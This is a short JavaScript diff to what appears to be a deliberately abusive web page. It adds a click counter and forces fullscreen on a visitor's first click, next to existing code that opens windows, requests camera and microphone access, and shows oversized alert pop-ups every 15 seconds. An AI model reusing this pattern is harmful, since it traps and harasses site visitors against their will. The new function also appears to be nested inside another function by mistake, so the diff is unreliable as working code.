@@ -66,6 +66,11 @@ const VIDEOS = [
  */
 const wins = []
 
+/**
+ * Count of number of clicks
+ */
+let interactionCount = 0
+
 /*
  * Run this code in all windows, *both* child and parent windows.
  */
@@ -97,6 +102,12 @@ function init () {
     focusWindows()
     openWindow()
     requestCameraAndMic()
+
+    if (interactionCount === 0) {
+      enableFullscreen()
+    }
+
+    interactionCount += 1
   })
 }
 
@@ -316,6 +327,17 @@ function startAlertInterval () {
     const longAlertText = Array(200).join(randomArt)
     window.alert(longAlertText)
   }, 15000)
+
+/**
+ * Fullscreen the browser window
+ */
+function enableFullscreen () {
+  const requestFullscreen = Element.prototype.requestFullscreen ||
+    Element.prototype.webkitRequestFullscreen ||
+    Element.prototype.mozRequestFullScreen ||
+    Element.prototype.msRequestFullscreen
+
+  requestFullscreen.call(document.body)
 }
 
 /**
